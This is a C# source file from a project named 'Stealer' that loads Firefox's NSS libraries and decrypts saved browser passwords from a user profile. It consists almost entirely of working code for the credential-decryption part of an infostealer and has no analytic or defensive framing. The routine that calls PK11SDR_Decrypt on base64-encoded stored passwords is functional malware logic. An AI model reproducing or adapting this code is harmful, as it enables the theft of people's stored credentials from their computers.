/*
    Coded by github.com/0xPh0enix
*/

using System;
using System.Text;
using System.Runtime.InteropServices;

namespace Stealer.Helpers
{
    internal sealed class WinApi
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr LoadLibrary(string sFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string sProcName);
    }

    internal sealed class Nss3
    {
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string sDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11SdrDecrypt(ref TSECItem tsData, ref TSECItem tsResult, int iContent);
    }
    public static class Decryptor
    {
        private static IntPtr hNss3;
        private static IntPtr hMozGlue;

        private static Nss3.NssInit fpNssInit;
        private static Nss3.Pk11SdrDecrypt fpPk11SdrDecrypt;
        private static Nss3.NssShutdown fpNssShutdown;

        public static bool LoadNSS(string sPath)
        {
            try
            {
                hMozGlue = WinApi.LoadLibrary(sPath + "\\mozglue.dll");
                hNss3 = WinApi.LoadLibrary(sPath + "\\nss3.dll");

                IntPtr ipNssInitAddr = WinApi.GetProcAddress(hNss3, "NSS_Init");
                IntPtr ipNssPk11SdrDecrypt = WinApi.GetProcAddress(hNss3, "PK11SDR_Decrypt");
                IntPtr ipNssShutdown = WinApi.GetProcAddress(hNss3, "NSS_Shutdown");

                fpNssInit = (Nss3.NssInit)Marshal.GetDelegateForFunctionPointer(ipNssInitAddr, typeof(Nss3.NssInit));
                fpPk11SdrDecrypt = (Nss3.Pk11SdrDecrypt)Marshal.GetDelegateForFunctionPointer(ipNssPk11SdrDecrypt, typeof(Nss3.Pk11SdrDecrypt));
                fpNssShutdown = (Nss3.NssShutdown)Marshal.GetDelegateForFunctionPointer(ipNssShutdown, typeof(Nss3.NssShutdown));

                return true;
            }
            catch (Exception ex) { Console.WriteLine("Failed to load NSS\n" + ex); return false; }

        }

        public static void UnLoadNSS()
        {
            fpNssShutdown();
            WinApi.FreeLibrary(hNss3);
            WinApi.FreeLibrary(hMozGlue);
        }

        public static bool SetProfile(string sProfile)
        {
            return (fpNssInit(sProfile) == 0);
        }

        public static string DecryptPassword(string sEncPass)
        {
            IntPtr lpMemory = IntPtr.Zero;

            try
            {
                byte[] bPassDecoded = Convert.FromBase64String(sEncPass);

                lpMemory = Marshal.AllocHGlobal(bPassDecoded.Length);
                Marshal.Copy(bPassDecoded, 0, lpMemory, bPassDecoded.Length);

                Nss3.TSECItem tsiOut = new Nss3.TSECItem();
                Nss3.TSECItem tsiItem = new Nss3.TSECItem();

                tsiItem.SECItemType = 0;
                tsiItem.SECItemData = lpMemory;
                tsiItem.SECItemLen = bPassDecoded.Length;

                if (fpPk11SdrDecrypt(ref tsiItem, ref tsiOut, 0) == 0)
                {
                    if (tsiOut.SECItemLen != 0)
                    {
                        byte[] bDecrypted = new byte[tsiOut.SECItemLen];
                        Marshal.Copy(tsiOut.SECItemData, bDecrypted, 0, tsiOut.SECItemLen);

                        return Encoding.UTF8.GetString(bDecrypted);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return null;
            }
            finally
            {
                if (lpMemory != IntPtr.Zero)
                    Marshal.FreeHGlobal(lpMemory);
            }

            return null;
        }

        public static string GetUTF8(string sNonUtf8)
        {
            try
            {
                byte[] bData = Encoding.Default.GetBytes(sNonUtf8);
                return Encoding.UTF8.GetString(bData);
            }
            catch { return sNonUtf8; }
        }
    }
}
